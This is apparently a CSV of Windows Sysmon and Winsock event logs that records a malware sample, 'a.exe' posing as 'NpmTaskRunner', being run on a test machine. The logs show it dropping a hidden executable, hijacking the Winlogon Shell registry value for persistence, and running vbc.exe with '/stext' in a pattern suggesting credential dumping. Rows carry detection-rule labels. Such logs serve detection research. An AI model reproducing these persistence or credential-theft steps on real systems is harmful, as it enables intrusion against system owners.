,Catalog,Category,Channel,Computer,Correlation,EventID,EventRecordID,Execution_ProcessID,Execution_ThreadID,Guid,Installer,Keywords,Level,Lspname,Opcode,Provider_Guid,Provider_Name,Security_UserID,Task,TimeCreated_SystemTime,Version,Commandline,Company,Currentdirectory,Description,Fileversion,Hashes,Image,Integritylevel,Logonguid,Logonid,Parentcommandline,Parentimage,Parentprocessguid,Parentprocessid,Processguid,Processid,Product,Rulename,Terminalsessionid,User,Utctime,Creationutctime,Targetfilename,Details,Eventtype,Targetobject,Imageloaded,Signature,Signaturestatus,Signed,Destinationhostname,Destinationip,Destinationisipv6,Destinationport,Destinationportname,Initiated,Protocol,Sourcehostname,Sourceip,Sourceisipv6,Sourceport,Sourceportname,Originalfilename,Destination,Name,Operation,Type,Consumer,Filter,Eventnamespace,Query,Calltrace,Grantedaccess,Sourceimage,Sourceprocessguid,Sourceprocessid,Sourcethreadid,Targetimage,Targetprocessguid,Targetprocessid
0,32,1016,Microsoft-Windows-Winsock-WS2HELP/Operational,MSEDGEWIN10,,1,1,5180,1088,{7E35F09E-CF45-CF00-3594-397712626D0F},C:\Windows\System32\MsiExec.exe,0x8000000000000000,0,PROXYCAP LSP,0,{D5C25F9A-4D47-493E-9184-40DD397A004D},Microsoft-Windows-Winsock-WS2HELP,,0,2019-08-23T12:37:37.100800900Z,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1,32,1021,Microsoft-Windows-Winsock-WS2HELP/Operational,MSEDGEWIN10,,1,2,5284,8096,{7E35F09E-CF45-CF00-3594-397712626D0F},C:\Windows\syswow64\MsiExec.exe,0x8000000000000000,0,PROXYCAP LSP,0,{D5C25F9A-4D47-493E-9184-40DD397A004D},Microsoft-Windows-Winsock-WS2HELP,,0,2019-08-23T12:37:38.521158400Z,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
2,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7530,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:17.988370700Z,5,"""C:\Users\IEUser\Downloads\a.exe"" ",,C:\Users\IEUser\Downloads\,NpmTaskRunner,1.0.0.0,"SHA1=E2286C233467D0E164ED5ED1D07BAC9F90F74D19,MD5=41CE32C0D1D4E5BB8C63674F317450EF,SHA256=5DE788D23B247B29F116CD0583280CE10A429E9F8C1D80C42DEAB20C6F4DBB4E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",C:\Users\IEUser\Downloads\a.exe,High,{365ABB72-1D89-5D04-0000-00206D330100},0x000000000001336d,C:\Windows\Explorer.EXE,C:\Windows\explorer.exe,{365ABB72-1DB8-5D04-0000-00109BF60500},2816,{365ABB72-1E19-5D04-0000-0010DFC60A00},4020,NpmTaskRunner,,1,IEWIN7\IEUser,2019-06-14 22:22:17.957,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,11,7531,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,11,2019-06-14T22:22:21.503995700Z,2,,,,,,,C:\Users\IEUser\Downloads\a.exe,,,,,,,,{365ABB72-1E19-5D04-0000-0010DFC60A00},4020,,,,,2019-06-14 22:22:21.503,2019-06-14 22:22:21.503,C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
4,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,13,7532,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2019-06-14T22:22:21.535245700Z,2,,,,,,,C:\Users\IEUser\Downloads\a.exe,,,,,,,,{365ABB72-1E19-5D04-0000-0010DFC60A00},4020,,Persistence - Winlogon Shell,,,2019-06-14 22:22:21.519,,,"""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe"",explorer.exe",SetValue,HKU\S-1-5-21-3583694148-1414552638-2922671848-1000\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
5,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7533,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:21.535245700Z,5,"""C:\Users\IEUser\Downloads\a.exe""",,C:\Users\IEUser\Downloads\,NpmTaskRunner,1.0.0.0,"SHA1=E2286C233467D0E164ED5ED1D07BAC9F90F74D19,MD5=41CE32C0D1D4E5BB8C63674F317450EF,SHA256=5DE788D23B247B29F116CD0583280CE10A429E9F8C1D80C42DEAB20C6F4DBB4E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",C:\Users\IEUser\Downloads\a.exe,High,{365ABB72-1D89-5D04-0000-00206D330100},0x000000000001336d,"""C:\Users\IEUser\Downloads\a.exe"" ",C:\Users\IEUser\Downloads\a.exe,{365ABB72-1E19-5D04-0000-0010DFC60A00},4020,{365ABB72-1E1D-5D04-0000-001003E70A00},1008,NpmTaskRunner,,1,IEWIN7\IEUser,2019-06-14 22:22:21.535,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
6,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,7,7536,1960,1916,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,7,2019-06-14T22:22:31.957120700Z,3,,Microsoft Corporation,,WMI,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=03DC8ABDF9C9948FE6E783DCA9C6C8264D635F0A,MD5=5610B0425518D185331CB8E968D060E6,SHA256=E235186C3BF266EE9EC733D2CFF35E3A65DE039C19B14260F4054F34B5E8AD41,IMPHASH=523D1DB34FC36465E35F6201A2FD561B",C:\Users\IEUser\Downloads\a.exe,,,,,,,,{365ABB72-1E1D-5D04-0000-001003E70A00},1008,Microsoft® Windows® Operating System,Execution - Suspicious WMI module load,,,2019-06-14 22:22:31.925,,,,,,C:\Windows\System32\wbem\wmiutils.dll,Microsoft Windows,Valid,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
7,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7537,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:32.222745700Z,5,"""C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe"" /stext ""C:\Users\IEUser\AppData\Local\Temp\tmpA185.tmp""",Microsoft Corporation,C:\Users\IEUser\Downloads\,Visual Basic Command Line Compiler,8.0.50727.5483,"SHA1=BE642993EFE69E35F3C17AC5630E8EE3958D9A1E,MD5=1672D0478049ABDAF0197BE64A7F867F,SHA256=C67F217DA287D8CEF48FA9E9DEE971D59D7EFABBD0C7F700664D7970D68B52EF,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe,High,{365ABB72-1D89-5D04-0000-00206D330100},0x000000000001336d,"""C:\Users\IEUser\Downloads\a.exe""",C:\Users\IEUser\Downloads\a.exe,{365ABB72-1E1D-5D04-0000-001003E70A00},1008,{365ABB72-1E28-5D04-0000-0010EC030B00},1584,Microsoft® Visual Studio® 2005,,1,IEWIN7\IEUser,2019-06-14 22:22:32.191,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
8,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7543,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:47.253995700Z,5,"""LogonUI.exe"" /flags:0x0",Microsoft Corporation,C:\Windows\system32\,Windows Logon User Interface Host,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=6FCAD4F6BB71049744D25F2B53A651AC5AA79187,MD5=3EF0D8AB08385AAB5802E773511A2E6A,SHA256=1A7EE4BC646767004372EAEA9BC0A2071790E739101F7D25ECD9C95D3F29AFD6,IMPHASH=B8FCE86F8F679B9FC7368F8F47778678",C:\Windows\System32\LogonUI.exe,System,{365ABB72-9C16-5D04-0000-0020E7030000},0x00000000000003e7,winlogon.exe,C:\Windows\System32\winlogon.exe,{365ABB72-9C16-5D04-0000-00104B5A0000},444,{365ABB72-1E37-5D04-0000-001049360B00},1552,Microsoft® Windows® Operating System,,1,NT AUTHORITY\SYSTEM,2019-06-14 22:22:47.128,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
9,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,5,7544,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,5,2019-06-14T22:22:52.457120700Z,3,,,,,,,C:\Users\IEUser\Downloads\a.exe,,,,,,,,{365ABB72-1E1D-5D04-0000-001003E70A00},1008,,,,,2019-06-14 22:22:52.332,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
